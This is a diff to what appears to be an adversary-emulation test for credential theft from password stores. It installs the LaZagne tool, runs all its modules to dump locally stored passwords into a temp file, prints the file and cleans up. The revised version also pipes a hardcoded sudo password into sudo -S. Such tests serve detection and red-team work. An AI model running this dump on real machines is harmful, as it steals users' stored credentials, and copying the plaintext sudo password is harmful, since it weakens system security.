@@ -1,10 +1,13 @@
-Elevation Required;
+;
 #pre
-apt install git; apt install python3-pip -y; pip install pyasn1 psutil Crypto
-cd /tmp; git clone https://github.com/AlessandroZ/LaZagne; cd /tmp/LaZagne/; pip install -r requirements.txt
+echo "010404grz" | sudo -S sh -c '((which yum && sudo yum -y install git zip python3-pip) || (which apt-get && sudo DEBIAN_FRONTEND=noninteractive apt-get install -y git zip python3-pip))'
+pip install pyasn1 psutil Crypto
+cd /tmp; unzip LaZagne.zip; cd LaZagne-master; pip install -r requirements.txt
 #command
-python3 /tmp/LaZagne/Linux/laZagne.py all > /tmp/T1555.txt
+echo "010404grz" | sudo -S python3 /tmp/LaZagne-master/Linux/laZagne.py all > /tmp/T1555.txt
 #check
+echo "使用python3 laZagne.py all命令启动开源项目LaZagne的所有模块，用于检索存储在本机各种常用软件中的密码，并将结果保存到临时文件中："
 cat /tmp/T1555.txt
 #cleanup
-rm -R /tmp/LaZagne; rm -f /tmp/T1555.txt
+rm -rf /tmp/LaZagne-master
+rm -f /tmp/T1555.txt /tmp/LaZagne.zip
